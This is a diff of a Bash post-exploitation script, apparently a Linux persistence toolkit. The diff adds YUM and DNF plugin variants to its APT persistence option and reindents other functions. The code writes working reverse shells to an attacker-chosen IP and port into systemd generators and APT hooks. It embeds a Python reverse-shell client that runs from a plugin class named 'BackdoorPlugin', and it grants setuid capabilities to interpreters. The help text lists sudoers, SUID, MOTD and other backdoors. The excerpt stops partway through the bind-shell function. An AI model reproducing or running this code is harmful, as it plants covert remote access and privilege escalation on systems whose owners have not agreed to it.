@@ -29,195 +29,195 @@ check_root() {
 }
 
 usage_user() {
-    echo ""
-    echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
-    echo ""
-    echo "Low Privileged User Options:"
-    echo ""
-    echo "  --cron                      Cron job persistence"
-    echo "    --default                    Use default cron settings"
-    echo "        --ip <ip>                  Specify IP address"
-    echo "        --port <port>              Specify port number"
-    echo "  --ssh-key                   SSH key persistence"
-    echo "      --default                    Use default SSH key settings"
-    echo "  --systemd                   Systemd service persistence"
-    echo "      --default                    Use default systemd settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
-    echo "          --path <path>                Specify custom service path (must end with .service)"
-    echo "          --command <command>          Specify custom persistence command (no validation)"
-    echo "          --timer                      Create systemd timer (1 minute interval)"
-    echo "  --at                         At job persistence"
-    echo "      --default                    Use default at settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-    echo "      --custom                     Use custom at settings"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-    echo "  --shell-configuration         Shell profile persistence"
-    echo "      --default                    Use default profile settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom profile settings"
-    echo "          --file <file>                Specify custom profile file"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "  --xdg                        XDG autostart persistence"
-    echo "      --default                    Use default XDG settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom XDG settings"
-    echo "          --file <file>                Specify custom desktop entry file"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "  --authorized-keys            Authorized keys management"
-    echo "      --default                    Use default authorized keys settings"
-    echo "          --key <key>                Specify the public key"
-    echo "  --bind-shell                 Setup a bind shell"
-    echo "      --default                    Use default bind shell settings"
-    echo "          --architecture <arch>       Specify architecture (x86 or x64)"
-    echo "      --custom                     Use custom bind shell binary"
-    echo "          --binary <binary>           Specify the path to the custom binary"
+	echo ""
+	echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
+	echo ""
+	echo "Low Privileged User Options:"
+	echo ""
+	echo "  --cron                      Cron job persistence"
+	echo "    --default                    Use default cron settings"
+	echo "        --ip <ip>                  Specify IP address"
+	echo "        --port <port>              Specify port number"
+	echo "  --ssh-key                   SSH key persistence"
+	echo "      --default                    Use default SSH key settings"
+	echo "  --systemd                   Systemd service persistence"
+	echo "      --default                    Use default systemd settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
+	echo "          --path <path>                Specify custom service path (must end with .service)"
+	echo "          --command <command>          Specify custom persistence command (no validation)"
+	echo "          --timer                      Create systemd timer (1 minute interval)"
+	echo "  --at                         At job persistence"
+	echo "      --default                    Use default at settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+	echo "      --custom                     Use custom at settings"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+	echo "  --shell-configuration         Shell profile persistence"
+	echo "      --default                    Use default profile settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom profile settings"
+	echo "          --file <file>                Specify custom profile file"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "  --xdg                        XDG autostart persistence"
+	echo "      --default                    Use default XDG settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom XDG settings"
+	echo "          --file <file>                Specify custom desktop entry file"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "  --authorized-keys            Authorized keys management"
+	echo "      --default                    Use default authorized keys settings"
+	echo "          --key <key>                Specify the public key"
+	echo "  --bind-shell                 Setup a bind shell"
+	echo "      --default                    Use default bind shell settings"
+	echo "          --architecture <arch>       Specify architecture (x86 or x64)"
+	echo "      --custom                     Use custom bind shell binary"
+	echo "          --binary <binary>           Specify the path to the custom binary"
 }
 
 usage_root() {
-    echo "Root User Options:"
-    echo ""
-    echo "  --cron                      Cron job persistence"
-    echo "      --default                    Use default cron settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom cron settings"
-    echo "          --command <command>         Specify custom persistence command (no validation)"
-    echo "          --crond                     Persist in cron.d directory"
-    echo "          --daily                     Persist in cron.daily directory"
-    echo "          --hourly                    Persist in cron.hourly directory"
-    echo "          --monthly                   Persist in cron.monthly directory"
-    echo "          --weekly                    Persist in cron.weekly directory"
-    echo "          --name <name>               Specify custom cron job name"
-    echo "          --crontab                   Persist in crontab file"
-    echo "  --ssh-key                   SSH key persistence"
-    echo "      --default                    Use default SSH key settings"
-    echo "      --custom                     Use custom SSH key settings"
-    echo "          --user <user>               Specify user for custom SSH key"
-    echo "  --systemd                   Systemd service persistence"
-    echo "      --default                    Use default systemd settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
-    echo "          --path <path>                Specify custom service path (must end with .service)"
-    echo "          --command <command>          Specify custom persistence command (no validation)"
-    echo "          --timer                      Create systemd timer (1 minute interval)"
-    echo "  --generator-persistence      Set up generator persistence"
-    echo "      --default                    Use default generator persistence settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "  --at                         At job persistence"
-    echo "      --default                    Use default at settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-    echo "      --custom                     Use custom at settings"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-    echo "  --shell-configuration         Shell profile persistence"
-    echo "      --default                    Use default profile settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom profile settings"
-    echo "          --file <file>                Specify custom profile file"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "  --xdg                        XDG autostart persistence"
-    echo "      --default                    Use default XDG settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom XDG settings"
-    echo "          --file <file>                Specify custom desktop entry file"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "  --authorized-keys            Authorized keys management"
-    echo "      --default                    Use default authorized keys settings"
-    echo "          --key <key>                Specify the public key"
-    echo "      --custom                     Use custom authorized keys settings"
-    echo "          --key <key>                Specify the public key"
-    echo "          --path <path>              Specify custom authorized keys file path"
-    echo "  --create-user                Create a new user"
-    echo "      --default                    Use default user creation settings"
-    echo "          --username <username>      Specify the username"
-    echo "          --password <password>      Specify the password"
-    echo "  --backdoor-user              Set up a backdoor user"
-    echo "      --default                    Use default backdoor user settings"
-    echo "          --username <username>      Specify the username"
-    echo "  --password-change            Change user password"
-    echo "      --default                    Use default password change settings"
-    echo "          --username <username>      Specify the username"
-    echo "          --password <password>      Specify the password"
-    echo "  --passwd-user                Add user to /etc/passwd with specified settings"
-    echo "      --default                    Use default passwd settings"
-    echo "          --username <username>      Specify the username"
-    echo "          --password <password>      Specify the password"
-    echo "      --custom                     Use custom passwd string"
-    echo "          --passwd-string <string>   Specify the passwd string"
-    echo "  --sudoers-backdoor           Set up sudoers backdoor"
-    echo "      --default                    Use default sudoers backdoor settings"
-    echo "          --username <username>      Specify the username"
-    echo "  --suid-backdoor              Set up SUID backdoor"
-    echo "      --default                    Use default SUID backdoor settings"
-    echo "      --custom                     Use custom SUID backdoor settings"
-    echo "          --binary <binary>          Specify the binary"
-    echo "  --cap-backdoor               Set up capabilities backdoor"
-    echo "      --default                    Use default capabilities settings"
-    echo "      --custom                     Use custom capabilities settings"
-    echo "          --capability <capability>  Specify the capability"
-    echo "          --binary <binary>          Specify the binary"
-    echo "  --motd-backdoor              Set up MOTD backdoor"
-    echo "      --default                    Use default MOTD backdoor settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom MOTD backdoor settings"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "          --path <path>                Specify custom path in /etc/update-motd.d/"
-    echo "  --rc-local-backdoor          Set up rc.local backdoor"
-    echo "      --default                    Use default rc.local backdoor settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom rc.local backdoor settings"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "  --initd-backdoor             Set up init.d backdoor"
-    echo "      --default                    Use default init.d backdoor settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom init.d backdoor settings"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "          --path <path>                Specify custom path in /etc/init.d/"
-    echo "  --apt-persistence            Set up APT persistence"
-    echo "      --default                    Use default APT persistence settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom APT persistence settings"
-    echo "          --command <command>          Specify custom persistence command"
-    echo "          --path <path>                Specify custom path in /etc/apt/apt.conf.d/"
-    echo "  --bind-shell                 Setup a bind shell"
-    echo "      --default                    Use default bind shell settings"
-    echo "          --architecture <arch>       Specify architecture (x86 or x64)"
-    echo "      --custom                     Use custom bind shell binary"
-    echo "          --binary <binary>           Specify the path to the custom binary"
-    echo "  --system-binary-backdoor     Set up a system binary backdoor"
-    echo "      --default                    Use default binary backdoor settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom binary backdoor settings"
-    echo "          --binary <binary>           Specify the binary to backdoor"
-    echo "          --command <command>         Specify the command to execute"
-    echo "  --udev                      Cron job persistence"
-    echo "      --default                    Use default cron settings"
-    echo "          --ip <ip>                  Specify IP address"
-    echo "          --port <port>              Specify port number"
-    echo "          --at                       Persist through At"
-    echo "          --cron                     Persist through Cron"
-    echo "          --systemd                  Persist through Systemd"
-    echo "      --custom                     Use custom cron settings"
-    echo "          --command <command>         Specify custom persistence command (no validation)"
-    echo "          --path                      Specify custom udev path (no validation)"
+	echo "Root User Options:"
+	echo ""
+	echo "  --cron                      Cron job persistence"
+	echo "      --default                    Use default cron settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom cron settings"
+	echo "          --command <command>         Specify custom persistence command (no validation)"
+	echo "          --crond                     Persist in cron.d directory"
+	echo "          --daily                     Persist in cron.daily directory"
+	echo "          --hourly                    Persist in cron.hourly directory"
+	echo "          --monthly                   Persist in cron.monthly directory"
+	echo "          --weekly                    Persist in cron.weekly directory"
+	echo "          --name <name>               Specify custom cron job name"
+	echo "          --crontab                   Persist in crontab file"
+	echo "  --ssh-key                   SSH key persistence"
+	echo "      --default                    Use default SSH key settings"
+	echo "      --custom                     Use custom SSH key settings"
+	echo "          --user <user>               Specify user for custom SSH key"
+	echo "  --systemd                   Systemd service persistence"
+	echo "      --default                    Use default systemd settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
+	echo "          --path <path>                Specify custom service path (must end with .service)"
+	echo "          --command <command>          Specify custom persistence command (no validation)"
+	echo "          --timer                      Create systemd timer (1 minute interval)"
+	echo "  --generator-persistence      Set up generator persistence"
+	echo "      --default                    Use default generator persistence settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "  --at                         At job persistence"
+	echo "      --default                    Use default at settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+	echo "      --custom                     Use custom at settings"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+	echo "  --shell-configuration         Shell profile persistence"
+	echo "      --default                    Use default profile settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom profile settings"
+	echo "          --file <file>                Specify custom profile file"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "  --xdg                        XDG autostart persistence"
+	echo "      --default                    Use default XDG settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom XDG settings"
+	echo "          --file <file>                Specify custom desktop entry file"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "  --authorized-keys            Authorized keys management"
+	echo "      --default                    Use default authorized keys settings"
+	echo "          --key <key>                Specify the public key"
+	echo "      --custom                     Use custom authorized keys settings"
+	echo "          --key <key>                Specify the public key"
+	echo "          --path <path>              Specify custom authorized keys file path"
+	echo "  --create-user                Create a new user"
+	echo "      --default                    Use default user creation settings"
+	echo "          --username <username>      Specify the username"
+	echo "          --password <password>      Specify the password"
+	echo "  --backdoor-user              Set up a backdoor user"
+	echo "      --default                    Use default backdoor user settings"
+	echo "          --username <username>      Specify the username"
+	echo "  --password-change            Change user password"
+	echo "      --default                    Use default password change settings"
+	echo "          --username <username>      Specify the username"
+	echo "          --password <password>      Specify the password"
+	echo "  --passwd-user                Add user to /etc/passwd with specified settings"
+	echo "      --default                    Use default passwd settings"
+	echo "          --username <username>      Specify the username"
+	echo "          --password <password>      Specify the password"
+	echo "      --custom                     Use custom passwd string"
+	echo "          --passwd-string <string>   Specify the passwd string"
+	echo "  --sudoers-backdoor           Set up sudoers backdoor"
+	echo "      --default                    Use default sudoers backdoor settings"
+	echo "          --username <username>      Specify the username"
+	echo "  --suid-backdoor              Set up SUID backdoor"
+	echo "      --default                    Use default SUID backdoor settings"
+	echo "      --custom                     Use custom SUID backdoor settings"
+	echo "          --binary <binary>          Specify the binary"
+	echo "  --cap-backdoor               Set up capabilities backdoor"
+	echo "      --default                    Use default capabilities settings"
+	echo "      --custom                     Use custom capabilities settings"
+	echo "          --capability <capability>  Specify the capability"
+	echo "          --binary <binary>          Specify the binary"
+	echo "  --motd-backdoor              Set up MOTD backdoor"
+	echo "      --default                    Use default MOTD backdoor settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom MOTD backdoor settings"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "          --path <path>                Specify custom path in /etc/update-motd.d/"
+	echo "  --rc-local-backdoor          Set up rc.local backdoor"
+	echo "      --default                    Use default rc.local backdoor settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom rc.local backdoor settings"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "  --initd-backdoor             Set up init.d backdoor"
+	echo "      --default                    Use default init.d backdoor settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom init.d backdoor settings"
+	echo "          --command <command>          Specify custom persistence command"
+	echo "          --path <path>                Specify custom path in /etc/init.d/"
+	echo "  --package-manager-persistence    Set up Package Manager persistence"
+	echo "      --default                    Use default APT persistence settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "          --apt                       Persist through APT configuration file"
+	echo "          --yum                       Persist through YUM plugin"
+	echo "          --dnf                       Persist through DNF plugin"	
+	echo "  --bind-shell                 Setup a bind shell"
+	echo "      --default                    Use default bind shell settings"
+	echo "          --architecture <arch>       Specify architecture (x86 or x64)"
+	echo "      --custom                     Use custom bind shell binary"
+	echo "          --binary <binary>           Specify the path to the custom binary"
+	echo "  --system-binary-backdoor     Set up a system binary backdoor"
+	echo "      --default                    Use default binary backdoor settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "      --custom                     Use custom binary backdoor settings"
+	echo "          --binary <binary>           Specify the binary to backdoor"
+	echo "          --command <command>         Specify the command to execute"
+	echo "  --udev                      Cron job persistence"
+	echo "      --default                    Use default cron settings"
+	echo "          --ip <ip>                  Specify IP address"
+	echo "          --port <port>              Specify port number"
+	echo "          --at                       Persist through At"
+	echo "          --cron                     Persist through Cron"
+	echo "          --systemd                  Persist through Systemd"
+	echo "      --custom                     Use custom cron settings"
+	echo "          --command <command>         Specify custom persistence command (no validation)"
+	echo "          --path                      Specify custom udev path (no validation)"
 }
 
 setup_systemd() {
@@ -434,55 +434,55 @@ setup_systemd() {
 }
 
 setup_generator_persistence() {
-    local default=0
-    local ip=""
-    local port=""
+	local default=0
+	local ip=""
+	local port=""
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --default )
-                default=1
-                ;;
-            --ip )
-                shift
-                ip=$1
-                ;;
-            --port )
-                shift
-                port=$1
-                ;;
-            * )
-                echo "Invalid option for --generator-persistence: $1"
-                exit 1
-        esac
-        shift
-    done
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
+			* )
+				echo "Invalid option for --generator-persistence: $1"
+				exit 1
+		esac
+		shift
+	done
 
-    if [[ $default -eq 0 ]]; then
-        echo "Error: --default must be specified."
-        exit 1
-    fi
+	if [[ $default -eq 0 ]]; then
+		echo "Error: --default must be specified."
+		exit 1
+	fi
 
-    if [[ -z $ip || -z $port ]]; then
-        echo "Error: --ip and --port must be specified."
-        exit 1
-    fi
+	if [[ -z $ip || -z $port ]]; then
+		echo "Error: --ip and --port must be specified."
+		exit 1
+	fi
 
-    if ! check_root; then
-        echo "Error: This function can only be run as root."
-        exit 1
-    fi
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
 
-    # Create the /usr/lib/systemd/system-generators/makecon file
-    cat <<-EOF > /usr/lib/systemd/system-generators/makecon
+	# Create the /usr/lib/systemd/system-generators/makecon file
+	cat <<-EOF > /usr/lib/systemd/system-generators/makecon
 	#!/bin/bash
 	nohup bash -c "while :; do bash -i >& /dev/tcp/$ip/$port 0>&1; sleep 10; done" &
 	EOF
 
-    chmod +x /usr/lib/systemd/system-generators/makecon
+	chmod +x /usr/lib/systemd/system-generators/makecon
 
-    # Create the /usr/lib/systemd/system-generators/generator file
-    cat <<-EOF > /usr/lib/systemd/system-generators/generator
+	# Create the /usr/lib/systemd/system-generators/generator file
+	cat <<-EOF > /usr/lib/systemd/system-generators/generator
 	#!/bin/sh
 	# Create a systemd service unit file in the late directory
 	cat <<-EOL > "/run/systemd/system/generator.service"
@@ -505,13 +505,13 @@ setup_generator_persistence() {
 	exit 0
 	EOF
 
-    chmod +x /usr/lib/systemd/system-generators/generator
+	chmod +x /usr/lib/systemd/system-generators/generator
 
-    # Reload systemd and enable the generator service
-    systemctl daemon-reload
-    systemctl enable generator
+	# Reload systemd and enable the generator service
+	systemctl daemon-reload
+	systemctl enable generator
 
-    echo "[+] System-generator has been successfully planted for persistence."
+	echo "[+] System-generator has been successfully planted for persistence."
 }
 
 setup_cron() {
@@ -1614,348 +1614,433 @@ setup_initd_backdoor() {
 	fi
 }
 
-setup_apt_persistence() {
+setup_package_manager_persistence() {
     local default=0
-    local custom=0
     local ip=""
     local port=""
-    local command=""
-    local path=""
+    local mechanism=""
 
     while [[ "$1" != "" ]]; do
         case $1 in
             --default )
                 default=1
                 ;;
-            --custom )
-                custom=1
-                ;;
             --ip )
                 shift
-                ip=$1
+                ip="$1"
                 ;;
             --port )
                 shift
-                port=$1
+                port="$1"
                 ;;
-            --command )
-                shift
-                command=$1
-                ;;
-            --path )
-                shift
-                path=$1
+            --apt | --dnf | --yum )
+                mechanism="$1"
                 ;;
             * )
-                echo "Invalid option for --apt-persistence: $1"
+                echo "Invalid option: $1"
                 exit 1
         esac
         shift
     done
 
-    if [[ $default -eq 1 && $custom -eq 1 ]]; then
-        echo "Error: --default and --custom cannot be specified together."
-        exit 1
-    fi
-
-    if [[ $default -eq 0 && $custom -eq 0 ]]; then
-        echo "Error: Either --default or --custom must be specified."
-        exit 1
-    fi
-
-    if ! check_root; then
-        echo "Error: This function can only be run as root."
-        exit 1
-    fi
-
     if [[ $default -eq 1 ]]; then
-        if [[ -z $ip || -z $port ]]; then
-            echo "Error: --ip and --port must be specified when using --default."
+        if [[ -z $ip || -z $port || -z $mechanism ]]; then
+            echo "Error: --default requires --ip, --port, and one of --apt, --yum, or --dnf."
             exit 1
         fi
 
-        path="/etc/apt/apt.conf.d/01python-upgrades"
-        echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
-        echo "[+] APT persistence established"
+        local python_script=$(cat <<- EOF
+		#!/usr/bin/env python
+		HOST = "$ip"
+		PORT = $port
 
-    elif [[ $custom -eq 1 ]]; then
-        if [[ -z $command || -z $path ]]; then
-            echo "Error: --command and --path must be specified when using --custom."
-            exit 1
-        fi
+		def connect(host_port):
+		    import socket
+		    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		    s.connect(host_port)
+		    return s
 
-        if [[ ! -f $path ]]; then
-            echo "APT::Update::Pre-Invoke {\"$command\"};" > $path
-            echo "[+] APT persistence established"
-        else
-            echo "APT::Update::Pre-Invoke {\"$command\"};" >> $path
-            echo "[+] APT persistence established"
-        fi
+		def wait_for_command(s):
+		    import subprocess
+		    data = s.recv(1024)
+		    if data == "quit\n":
+		        s.close()
+		        sys.exit(0)
+		    elif len(data) == 0:
+		        return True
+		    else:
+		        proc = subprocess.Popen(data, shell=True,
+		                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+		                                stdin=subprocess.PIPE)
+		        stdout_value = proc.stdout.read() + proc.stderr.read()
+		        s.send(stdout_value)
+		        return False
+
+		def main():
+		    import sys, os, socket, time
+		    while True:
+		        socket_died = False
+		        try:
+		            s = connect((HOST, PORT))
+		            while not socket_died:
+		                socket_died = wait_for_command(s)
+		            s.close()
+		        except socket.error:
+		            pass
+		        time.sleep(5)
+
+		if __name__ == "__main__":
+		    main()
+		EOF
+		)
+
+        case $mechanism in
+            --apt )
+                if [[ ! -x "$(command -v apt)" ]]; then
+                    echo "APT is not installed. Please install APT to use this option."
+                    exit 1
+                fi
+
+                path="/etc/apt/apt.conf.d/01python-upgrades"
+                echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
+                echo "[+] APT persistence established"
+                ;;
+            --yum )
+                if [[ ! -x "$(command -v yum)" ]]; then
+                    echo "Yum is not installed. Please install Yum to use this option."
+                    exit 1
+                fi
+
+                if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
+                    echo "Yum is symlinked to DNF. Please use --dnf option."
+                    exit 1
+                fi
+
+                echo "$python_script" > /usr/lib/yumcon
+                chmod +x /usr/lib/yumcon
+
+                echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
+
+                cat <<- 'EOF' > /usr/lib/yum-plugins/yumcon.py
+				import os
+
+				try:
+				    from yum.plugins import TYPE_INTERACTIVE, PluginYumExit
+				    requires_api_version = '2.0'
+				    plugin_type = TYPE_INTERACTIVE
+				except ImportError:
+				    requires_api_version = '1.0'
+
+				def pretrans_hook(conduit):
+				    os.system('setsid /usr/lib/yumcon 2>/dev/null & ')
+				EOF
+                echo "[+] Yum persistence established"
+                ;;
+            --dnf )
+                if [[ ! -x "$(command -v dnf)" ]]; then
+                    echo "DNF is not installed. Please install DNF to use this option."
+                    exit 1
+                fi
+
+                python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
+                python_path=$(which python)
+
+                echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
+                chmod +x /usr/lib/$python_version/site-packages/dnfcon
+
+                echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf
+
+                cat <<- EOF > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
+				import dnf
+				import os
+
+				def execute_dnfcon():
+				    os.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')
+
+				class BackdoorPlugin(dnf.Plugin):
+				    name = 'dnfcon'
+
+				    def __init__(self, base, cli):
+				        super(BackdoorPlugin, self).__init__(base, cli)
+				        execute_dnfcon()
+
+				def __init__(self, base, conf, **kwargs):
+				    dnf.Plugin.__init__(self, base, conf, **kwargs)
+				    execute_dnfcon()
+
+				plugin = BackdoorPlugin
+				EOF
+                echo "[+] DNF persistence established"
+                ;;
+        esac
+    else
+        echo "Error: --default must be specified."
+        exit 1
     fi
 }
 
 setup_cap_backdoor() {
-    local default=0
-    local custom=0
-    local capability=""
-    local binary=""
+	local default=0
+	local custom=0
+	local capability=""
+	local binary=""
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --default )
-                default=1
-                ;;
-            --custom )
-                custom=1
-                ;;
-            --capability )
-                shift
-                capability=$1
-                ;;
-            --binary )
-                shift
-                binary=$1
-                ;;
-            * )
-                echo "Invalid option for --cap-backdoor: $1"
-                exit 1
-        esac
-        shift
-    done
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--capability )
+				shift
+				capability=$1
+				;;
+			--binary )
+				shift
+				binary=$1
+				;;
+			* )
+				echo "Invalid option for --cap-backdoor: $1"
+				exit 1
+		esac
+		shift
+	done
 
-    if [[ $default -eq 1 && $custom -eq 1 ]]; then
-        echo "Error: --default and --custom cannot be specified together."
-        exit 1
-    fi
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		exit 1
+	fi
 
-    if [[ $default -eq 0 && $custom -eq 0 ]]; then
-        echo "Error: Either --default or --custom must be specified."
-        exit 1
-    fi
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: Either --default or --custom must be specified."
+		exit 1
+	fi
 
-    if ! check_root; then
-        echo "Error: This function can only be run as root."
-        exit 1
-    fi
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
 
-    if [[ $default -eq 1 ]]; then
-        local binaries=("perl" "ruby", "php" "python" "python3", "node")
-        for bin in "${binaries[@]}"; do
-            if command -v $bin &> /dev/null; then
-                local path=$(command -v $bin)
-                setcap cap_setuid+ep $path
-                if [[ $? -eq 0 ]]; then
-                    echo "[+] Capability setuid granted to $path"
-                else
-                    echo "[-] Failed to grant capability setuid to $path"
-                fi
-            else
-                echo "[-] $bin is not present on the system."
-            fi
-        done
-    elif [[ $custom -eq 1 ]]; then
-        if [[ -z $capability || -z $binary ]]; then
-            echo "Error: --capability and --binary must be specified with --custom."
-            exit 1
-        fi
+	if [[ $default -eq 1 ]]; then
+		local binaries=("perl" "ruby", "php" "python" "python3", "node")
+		for bin in "${binaries[@]}"; do
+			if command -v $bin &> /dev/null; then
+				local path=$(command -v $bin)
+				setcap cap_setuid+ep $path
+				if [[ $? -eq 0 ]]; then
+					echo "[+] Capability setuid granted to $path"
+				else
+					echo "[-] Failed to grant capability setuid to $path"
+				fi
+			else
+				echo "[-] $bin is not present on the system."
+			fi
+		done
+	elif [[ $custom -eq 1 ]]; then
+		if [[ -z $capability || -z $binary ]]; then
+			echo "Error: --capability and --binary must be specified with --custom."
+			exit 1
+		fi
 
-        if command -v $binary &> /dev/null; then
-            local path=$(command -v $binary)
-            setcap $capability $path
-            if [[ $? -eq 0 ]]; then
-                echo "[+] Capability $capability granted to $path"
-            else
-                echo "[-] Failed to grant capability $capability to $path"
-            fi
-        else
-            echo "[-] $binary is not present on the system."
-        fi
-    fi
+		if command -v $binary &> /dev/null; then
+			local path=$(command -v $binary)
+			setcap $capability $path
+			if [[ $? -eq 0 ]]; then
+				echo "[+] Capability $capability granted to $path"
+			else
+				echo "[-] Failed to grant capability $capability to $path"
+			fi
+		else
+			echo "[-] $binary is not present on the system."
+		fi
+	fi
 }
 
 setup_bind_shell() {
-    local default=0
-    local custom=0
-    local architecture=""
-    local binary=""
+	local default=0
+	local custom=0
+	local architecture=""
+	local binary=""
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --default )
-                default=1
-                ;;
-            --custom )
-                custom=1
-                ;;
-            --architecture )
-                shift
-                architecture=$1
-                ;;
-            --binary )
-                shift
-                binary=$1
-                ;;
-            * )
-                echo "Invalid option for --bind-shell: $1"
-                exit 1
-        esac
-        shift
-    done
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--architecture )
+				shift
+				architecture=$1
+				;;
+			--binary )
+				shift
+				binary=$1
+				;;
+			* )
+				echo "Invalid option for --bind-shell: $1"
+				exit 1
+		esac
+		shift
+	done
 
-    if [[ $default -eq 1 && $custom -eq 1 ]]; then
-        echo "Error: --default and --custom cannot be specified together."
-        exit 1
-    fi
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		exit 1
+	fi
 
-    if [[ $default -eq 1 ]]; then
-        if [[ -z $architecture ]]; then
-            echo "Error: --architecture (x64/x86) must be specified when using --default."
-            exit 1
-        fi
